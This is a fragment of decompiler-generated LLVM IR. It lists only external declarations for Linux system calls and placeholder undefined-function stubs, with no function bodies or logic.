declare i32 @getpid(i32) local_unnamed_addr

declare i32 @getppid(i32) local_unnamed_addr

declare i32 @ioctl(i32, i32, ...) local_unnamed_addr

declare i32 @kill(i32, i32) local_unnamed_addr

declare i32 @open(i8*, i32, ...) local_unnamed_addr

declare i32 @prctl(i32, i32, i32, i32, i32) local_unnamed_addr

declare i32 @read(i32, i32*, i32) local_unnamed_addr

declare i32 @readlink(i8*, i8*, i32) local_unnamed_addr

declare i32 @setsid(i32) local_unnamed_addr

declare i32 @sigprocmask(i32, %_TYPEDEF_sigset_t*, %_TYPEDEF_sigset_t*) local_unnamed_addr

declare i32 @time(i32*) local_unnamed_addr

declare i32 @unlink(i8*) local_unnamed_addr

declare i32 @write(i32, i32*, i32) local_unnamed_addr

declare i32 @sigreturn(%sigcontext*) local_unnamed_addr

declare i32* @mmap(i32*, i32, i32, i32, i32, i32) local_unnamed_addr

declare i32 @sigaction(i32, %sigaction*, %sigaction*) local_unnamed_addr

declare void @exit(i32) local_unnamed_addr

declare i32 @clock_getres(i32, %timespec*) local_unnamed_addr

declare i32 @fstat(i32, %stat*) local_unnamed_addr

declare i32 @getdents64(i32, %linux_dirent64*, i32) local_unnamed_addr

declare i32* @mremap(i32*, i32, i32, i32, ...) local_unnamed_addr

declare i32 @munmap(i32*, i32) local_unnamed_addr

declare i32 @nanosleep(%timespec*, %timespec*) local_unnamed_addr

declare i32 @times(%tms*) local_unnamed_addr

declare i32 @__decompiler_undefined_function_0() local_unnamed_addr

declare i16 @__decompiler_undefined_function_1() local_unnamed_addr

declare i8* @__decompiler_undefined_function_2() local_unnamed_addr

declare i8 @__decompiler_undefined_function_3() local_unnamed_addr

declare i16* @__decompiler_undefined_function_4() local_unnamed_addr

declare i64 @__decompiler_undefined_function_5() local_unnamed_addr

declare %_TYPEDEF_sigset_t* @__decompiler_undefined_function_6() local_unnamed_addr

declare %sigaction* @__decompiler_undefined_function_7() local_unnamed_addr

declare %timespec* @__decompiler_undefined_function_8() local_unnamed_addr

declare %tms* @__decompiler_undefined_function_9() local_unnamed_addr

attributes #0 = { noreturn }
attributes #1 = { nounwind readnone }
